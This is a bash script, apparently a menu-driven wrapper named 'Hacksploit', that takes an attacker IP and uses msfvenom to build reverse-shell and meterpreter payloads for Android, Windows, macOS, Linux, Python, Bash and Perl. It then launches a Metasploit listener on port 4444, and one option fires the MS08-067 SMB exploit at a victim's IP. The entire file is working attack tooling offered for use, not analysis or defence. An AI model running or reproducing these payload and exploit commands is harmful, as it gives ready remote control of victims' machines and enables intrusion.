echo "
    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐
    ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
    ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik)

"
echo "NOTE: we will keep the default port as 4444"

read -p "IP: " ip

clear
echo "
    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐
    ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
    ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik)

"

echo "

1] Android Payload | 5] Windows 7 Hunting with IP (SMB)
                   | 
2] Windows Payload | 6] Python Payload
                   |
3] Mac Payload     | 7] Bash Payload
                   |
4] Linux Paylaod   | 8] Perl


"
read -p "Select option : " yn
    case $yn in
        [1]* ) msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit.apk; echo "Payload location is /root/Desktop/Hacksploit.apk"; msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [2]* ) msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit.exe; echo "Payload location is /root/Desktop/Hacksploit.exe"; msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [3]* ) msfvenom -p osx/x86/shell_reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit.macho; echo "Payload location is /root/Desktop/Hacksploit.macho"; msfconsole -q -x " use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [4]* ) msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit.elf; echo "Payload location is /root/Desktop/Hacksploit.elf"; msfconsole -q -x " use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [5]* ) read -p "Victims IP: " vip; msfconsole -q -x " use windows/smb/ms08_067_netapi; set payload windows/meterpreter/reverse_tcp;  ; set RHOST $vip; set lhost $ip ; set lport 4444 ; exploit ;";;
        [6]* ) msfvenom -p cmd/unix/reverse_python lhost=$ip lport=4444 > /root/Desktop/Hacksploit.py; echo "Payload location is /root/Desktop/Hacksploit.py"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_python;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [7]* ) msfvenom -p cmd/unix/reverse_bash lhost=$ip lport=4444 > /root/Desktop/Hacksploit.sh; echo "Payload location is /root/Desktop/Hacksploit.sh"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_bash;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [8]* ) msfvenom -p cmd/unix/reverse_perl lhost=$ip lport=4444 > /root/Desktop/Hacksploit.pl; echo "Payload location is /root/Desktop/Hacksploit.pl"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_perl;  set lhost $ip ; set lport 4444 ; exploit ;";;

        * ) echo "Please select the options only from the menu.";;
    esac
done
